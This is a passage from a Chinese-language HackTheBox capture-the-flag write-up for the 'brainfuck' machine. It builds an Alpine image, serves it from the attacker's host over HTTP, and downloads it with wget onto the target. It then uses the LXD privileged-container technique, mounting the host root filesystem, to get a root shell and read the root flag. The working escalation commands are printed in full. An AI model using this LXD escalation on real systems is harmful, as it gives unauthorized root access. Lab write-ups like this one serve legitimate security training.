忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\nDownloading apk-tools-static-2.12.10-r1.apk\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\nalpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: 成功\nVerified OK\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  2527  100  2527    0     0    740      0  0:00:03  0:00:03 --:--:--   741\n--2023-01-19 15:38:57--  http://alpine.mirror.wearetriple.com/MIRRORS.txt\n正在解析主机 alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 2a00:1f00:dc06:10::106, 93.187.10.106\n正在连接 alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|2a00:1f00:dc06:10::106|:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 OK\n长度：2527 (2.5K) [text/plain]\n正在保存至: “/root/Desktop/rootfs/usr/share/alpine-mirrors/MIRRORS.txt”\n\n/root/Desktop/rootfs/usr/share/alpine-mirrors/MIRROR 100%[=====================================================================================================================>]   2.47K  --.-KB/s  用时 0s      \n\n2023-01-19 15:39:00 (77.3 MB/s) - 已保存 “/root/Desktop/rootfs/usr/share/alpine-mirrors/MIRRORS.txt” [2527/2527])\n\nSelecting mirror http://mirror.clarkson.edu/alpine//v3.17/main\nfetch http://mirror.clarkson.edu/alpine//v3.17/main/x86_64/APKINDEX.tar.gz\n(1/25) Installing alpine-baselayout-data (3.4.0-r0)\n(2/25) Installing musl (1.2.3-r4)\n(3/25) Installing busybox (1.35.0-r29)\nExecuting busybox-1.35.0-r29.post-install\n(4/25) Installing busybox-binsh (1.35.0-r29)\n(5/25) Installing alpine-baselayout (3.4.0-r0)\nExecuting alpine-baselayout-3.4.0-r0.pre-install\nExecuting alpine-baselayout-3.4.0-r0.post-install\n(6/25) Installing ifupdown-ng (0.12.1-r1)\n(7/25) Installing libcap2 (2.66-r0)\n(8/25) Installing openrc (0.45.2-r7)\nExecuting openrc-0.45.2-r7.post-install\n(9/25) Installing mdev-conf (4.3-r0)\n(10/25) Installing busybox-mdev-openrc (1.35.0-r29)\n(11/25) Installing alpine-conf (3.15.0-r0)\n(12/25) Installing alpine-keys (2.4-r1)\n(13/25) Installing alpine-release (3.17.1-r0)\n(14/25) Installing ca-certificates-bundle (20220614-r4)\n(15/25) Installing libcrypto3 (3.0.7-r2)\n(16/25) Installing libssl3 (3.0.7-r2)\n(17/25) Installing ssl_client (1.35.0-r29)\n(18/25) Installing zlib (1.2.13-r0)\n(19/25) Installing apk-tools (2.12.10-r1)\n(20/25) Installing busybox-openrc (1.35.0-r29)\n(21/25) Installing busybox-suid (1.35.0-r29)\n(22/25) Installing scanelf (1.3.5-r1)\n(23/25) Installing musl-utils (1.2.3-r4)\n(24/25) Installing libc-utils (0.7.2-r3)\n(25/25) Installing alpine-base (3.17.1-r0)\nExecuting busybox-1.35.0-r29.trigger\nOK: 10 MiB in 25 packages\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ls\n alpine-v3.17-x86_64-20230119_1539.tar.gz\n```\n多了一个压缩文件\n\n## Step 3\n使用 python3 开启一个 http 服务\n\n```bash\npython3 -m http.server 80\n```\n## Step 4\n在靶机中使用 wget 下载，然后运行\n\n```bash\norestis@brainfuck:~$ wget http://10.10.16.11/alpine-v3.17-x86_64-20230119_1539.tar.gz\n--2023-01-19 09:41:24--  http://10.10.16.11/alpine-v3.17-x86_64-20230119_1539.tar.gz\nConnecting to 10.10.16.11:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 3792999 (3.6M) [application/gzip]\nSaving to: ‘alpine-v3.17-x86_64-20230119_1539.tar.gz’\n\nalpine-v3.17-x86_64-20230119_1539.tar.gz             100%[=====================================================================================================================>]   3.62M   810KB/s    in 11s     \n\n2023-01-19 09:41:37 (328 KB/s) - ‘alpine-v3.17-x86_64-20230119_1539.tar.gz’ saved [3792999/3792999]\n```\n```bash\norestis@brainfuck:~$ lxc image import alpine-v3.17-x86_64-20230119_1539.tar.gz --alias test\nGenerating a client certificate. This may take a minute...\nIf this is your first time using LXD, you should also run: sudo lxd init\nTo start your first container, try: lxc launch ubuntu:16.04\n\nImage imported with fingerprint: 2f15d7d049eb4ce507a0ec903b690f37e78c2166c9d6fd062dbfed81b3816467\norestis@brainfuck:~$ lxc image list\n+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+\n| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |\n+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+\n| test  | 2f15d7d049eb | no     | alpine v3.17 (20230119_15:39) | x86_64 | 3.62MB | Jan 19, 2023 at 7:43am (UTC) |\n+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+\n```\n已经运行成功了，咱们去继续利用\n\n```bash\nlxc init test test -c security.privileged=true # 初始化镜像\nlxc config device add test test disk source=/ path=/mnt/root recursive=true # 挂载磁盘\nlxc start test # 启动镜像\nlxc exec test /bin/sh # 进入镜像\n```\n```bash\norestis@brainfuck:~$ lxc exec test /bin/sh\n~ # whoami&&id\nroot\nuid=0(root) gid=0(root)\n```\n成功拿到 root 权限\n\n```bash\n~ # cat /mnt/root/root/root.txt\n6efc1a5dbb8904751ce6566a305bb8ef\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]}]